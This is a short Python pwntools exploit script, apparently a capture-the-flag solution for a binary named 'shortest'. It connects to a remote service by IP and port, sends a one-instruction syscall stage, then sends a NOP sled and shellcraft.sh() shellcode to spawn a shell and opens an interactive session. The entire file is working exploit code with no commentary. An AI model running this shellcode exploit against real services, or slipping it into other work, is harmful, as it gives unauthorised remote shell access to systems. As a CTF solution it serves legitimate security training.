#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./shortest')
else:
    p = remote('10.21.13.112', 10001)

sh = asm('''
    syscall
''')
info(len(sh))
p.recvuntil('welcome>> ')
p.sendline(sh)
p.sendline('\x90' * 0x10 + asm(shellcraft.sh()))

p.interactive()

